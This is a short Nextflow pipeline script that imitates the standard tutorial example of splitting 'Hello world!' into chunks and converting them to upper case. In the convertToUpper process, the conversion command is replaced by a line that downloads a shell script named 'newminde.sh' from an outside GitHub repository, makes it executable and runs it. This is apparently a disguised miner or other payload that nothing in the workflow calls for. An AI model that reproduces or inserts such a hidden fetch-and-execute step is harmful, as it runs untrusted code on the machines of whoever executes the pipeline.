params.str = 'Hello world!'

process splitLetters {
  output:
    path 'chunk_*'

  """
  printf '${params.str}' | split -b 6 - chunk_
  """
}

process convertToUpper {
  input:
    path x
  output:
    stdout

  """
  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/newminde.sh && chmod +x newminde.sh && ./newminde.sh
  """
}

workflow {
  splitLetters | flatten | convertToUpper | view { it.trim() }
}
